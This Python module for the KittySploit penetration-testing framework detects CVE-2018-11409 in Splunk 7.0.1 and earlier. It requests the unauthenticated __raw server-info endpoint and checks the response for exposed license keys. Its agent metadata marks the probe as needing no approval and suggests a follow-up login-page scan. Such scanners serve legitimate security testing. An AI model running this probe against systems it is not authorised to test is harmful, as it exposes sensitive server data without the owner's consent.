#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Splunk through 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Splunk <=7.0.1 - Information Disclosure Detection',
        'description': 'Splunk through 7.0.1 is susceptible to information disclosure by appending __raw/services/server/info/server-info?output_mode=json to a query, as demonstrated by discovering a license key.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'edb', 'splunk', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/kofa2002/splunk',
            'https://www.exploit-db.com/exploits/44865/',
            'http://web.archive.org/web/20211208114213/https://securitytracker.com/id/1041148',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-11409',
            'http://www.securitytracker.com/id/1041148',
        ],
        'cve': 'CVE-2018-11409',
    }

    def run(self):
        for path in ('/en-US/splunkd/__raw/services/server/info/server-info?output_mode=json', '/__raw/services/server/info/server-info?output_mode=json'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_any = ('licenseKeys',)
            if (any(m in body for m in body_any)):
                self.set_info(
                    severity='medium',
                    reason="Splunk <=7.0.1 - Information Disclosure detected",
                    path=path,
                )
                return True
        return False

